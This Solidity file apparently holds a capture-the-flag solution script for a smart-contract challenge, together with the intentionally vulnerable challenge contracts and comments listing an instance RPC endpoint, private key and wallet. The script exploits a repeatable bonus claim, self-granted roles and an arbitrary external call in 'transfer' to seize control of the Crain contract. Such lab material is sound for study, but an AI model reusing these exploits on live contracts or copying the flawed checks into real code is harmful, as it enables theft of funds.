// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x16F1Cef782d12216c065B5938F363D2B407670dD);
    address wallet = 0x5E5c6E324d677286A2744A90FB70C303eD1ce1c1;
    CrainExecutive public cexe = setup.cexe();
    Crain public crain = setup.crain();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x9492fb2913afdbfdf86a9625627a7d0f9d92618212f7143d35f40dfaf83b0c33);

        cexe.claimStartingBonus();
        cexe.claimStartingBonus();
        cexe.claimStartingBonus();
        cexe.claimStartingBonus();
        cexe.claimStartingBonus();

        cexe.becomeEmployee();
        cexe.becomeManager();
        cexe.becomeExecutive();

        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", wallet);
        cexe.transfer(address(crain), 0, data);
        
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	ee398d3e-0f44-469a-a750-ccd02abb86fd
// RPC Endpoint	http://103.178.153.113:50003/ee398d3e-0f44-469a-a750-ccd02abb86fd
// Private Key	0x9492fb2913afdbfdf86a9625627a7d0f9d92618212f7143d35f40dfaf83b0c33
// Setup Contract	0x16F1Cef782d12216c065B5938F363D2B407670dD
// Wallet	0x5E5c6E324d677286A2744A90FB70C303eD1ce1c1

contract Setup{
    CrainExecutive public cexe;
    Crain public crain;

    constructor() payable{
        cexe = new CrainExecutive{value: 50 ether}();
        crain = new Crain(payable(address(cexe)));
    }

    function isSolved() public view returns(bool){
        return crain.crain() != address(this);
    }

}

contract CrainExecutive{
    
    address public owner;
    uint256 public totalSupply;

    address[] public Executives;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public permissionToExchange; 
    mapping(address => bool) public hasTakeBonus;
    mapping(address => bool) public isEmployee;
    mapping(address => bool) public isManager;
    mapping(address => bool) public isExecutive;

    modifier _onlyOnePerEmployee(){
        require(hasTakeBonus[msg.sender] == false, "Bonus can only be taken once!");
        _;
    }

    modifier _onlyExecutive(){
        require(isExecutive[msg.sender] == true, "Only Higher Ups can access!");
        _;
    }

    modifier _onlyManager(){
        require(isManager[msg.sender] == true, "Only Higher Ups can access!");
        _;
    }

    modifier _onlyEmployee(){
        require(isEmployee[msg.sender] == true, "Only Employee can exchange!");
        _;
    }

    constructor() payable{
        owner = msg.sender;
        totalSupply = 50 ether;
        balanceOf[msg.sender] = 25 ether;
    }

    function claimStartingBonus() public _onlyOnePerEmployee{
        balanceOf[owner] -= 1e18;
        balanceOf[msg.sender] += 1e18;
    }

    function becomeEmployee() public {
        isEmployee[msg.sender] = true;
    }

    function becomeManager() public _onlyEmployee{
        require(balanceOf[msg.sender] >= 1 ether, "Must have at least 1 ether");
        require(isEmployee[msg.sender] == true, "Only Employee can be promoted");
        isManager[msg.sender] = true;
    } 

    function becomeExecutive() public {
        require(isEmployee[msg.sender] == true && isManager[msg.sender] == true);
        require(balanceOf[msg.sender] >= 5 ether, "Must be that Rich to become an Executive");
        isExecutive[msg.sender] = true;
    }

    function buyCredit() public payable _onlyEmployee{
        require(msg.value >= 1 ether, "Minimum is 1 Ether");
        uint256 totalBought = msg.value;
        balanceOf[msg.sender] += totalBought;
        totalSupply += totalBought;
    }

    function sellCredit(uint256 _amount) public _onlyEmployee{
        require(balanceOf[msg.sender] - _amount >= 0, "Not Enough Credit");
        uint256 totalSold = _amount;
        balanceOf[msg.sender] -= totalSold;
        totalSupply -= totalSold;
    }

    function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
        require(to != address(0), "Invalid Recipient");
        require(balanceOf[msg.sender] - _amount >= 0, "Not enough Credit");
        uint256 totalSent = _amount;
        balanceOf[msg.sender] -= totalSent;
        balanceOf[to] += totalSent;
        (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
        require(transfered, "Failed to Transfer Credit!");
    }

}

contract Crain{
    CrainExecutive public ce;
    address public crain;

    modifier _onlyExecutives(){
        require(msg.sender == address(ce), "Only Executives can replace");
        _;
    }

    constructor(address payable _ce) {
        ce = CrainExecutive(_ce);
        crain = msg.sender;
    }


    function ascendToCrain(address _successor) public _onlyExecutives{
        crain = _successor;
    }

    receive() external payable { }

}